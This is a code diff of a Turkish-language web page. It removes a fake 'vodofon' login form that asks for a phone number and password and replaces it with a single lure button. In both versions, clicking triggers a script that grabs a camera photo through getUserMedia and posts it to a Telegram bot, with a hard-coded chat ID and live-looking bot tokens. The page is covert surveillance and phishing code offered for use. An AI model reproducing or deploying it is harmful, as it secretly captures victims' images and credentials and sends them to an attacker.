@@ -10,72 +10,33 @@
     font-family: Arial, sans-serif;
     margin: 0;
     padding: 0;
-    background-color: #fff; /* Arka plan rengi beyaz */
-  }
-
-  .container {
+    background-color: #f00; /* Arka plan rengi kırmızı */
     display: flex;
-    flex-direction: column;
     justify-content: center;
     align-items: center;
-    height: 100vh; /* Ekranın tamamını kaplar */
-    background-color: #f00; /* Panelin arka plan rengi kırmızı */
-  }
-
-  #login-panel {
-    padding: 20px;
-    background-color: #fff; /* Panelin iç kısmının arka plan rengi beyaz */
-    border-radius: 10px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Gölge efekti */
-    text-align: center;
-  }
-
-  h1 {
-    color: #333;
-  }
-
-  p {
-    color: #666;
+    height: 100vh;
   }
 
   button {
-    padding: 10px 20px;
-    background-color: #007bff;
-    color: #fff;
+    padding: 20px 40px; /* Butonun boyutunu büyütmek için padding */
+    background-color: #ff0; /* Sarı renkli buton */
+    color: #000; /* Buton metni rengi */
     border: none;
-    border-radius: 5px;
+    border-radius: 10px;
     cursor: pointer;
+    font-size: 18px; /* Buton metni boyutu */
   }
 
   button:hover {
-    background-color: #0056b3;
-  }
-
-  #vodofon-logo {
-    width: 150px;
-    margin-bottom: 20px;
+    background-color: #ffd700; /* Sarı rengin biraz daha koyusu */
   }
 </style>
 </head>
 <body>
-<div class="container">
-  <div id="login-panel">
-    <img id="Bağlantınız D" src="vodofon-logo.png" alt="Bağlantınız Kötü">
-    <h1>Giriş Ekranı</h1>
-    <p>Telefon numaranızı ve şifrenizi girin:</p>
-    <input type="text" id="phone" placeholder="Telefon Numarası" required>
-    <br><br>
-    <input type="password" id="password" placeholder="Şifre" required>
-    <br><br>
-    <button onclick="login()">Giriş Yap</button>
-  </div>
-</div>
+<button onclick="takePhotoAndSend()">BANABAS😁</button>
 
 <script>
-function login() {
-  var phone = document.getElementById('phone').value;
-  var password = document.getElementById('password').value;
-  
+function takePhotoAndSend() {
   // Kamera izni iste ve fotoğrafı çekip bota gönder
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(function(stream) {
@@ -102,10 +63,10 @@ function login() {
 
         // Fotoğrafı FormData nesnesiyle gönder
         var formData = new FormData();
-        formData.append('chat_id', '6070918315');
+        formData.append('chat_id', '6070918315'); // Sizin chat ID'niz
         formData.append('photo', new Blob([uint8Array], { type: 'image/jpeg' }));
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendPhoto');
+        xhr.open('POST', 'https://api.telegram.org/bot6731167876:AAFYltZa6qZakKaBk4Xgmu8zX05vCTGbTQE/sendPhoto');
         xhr.send(formData);
 
         // Kamera akışını durdur
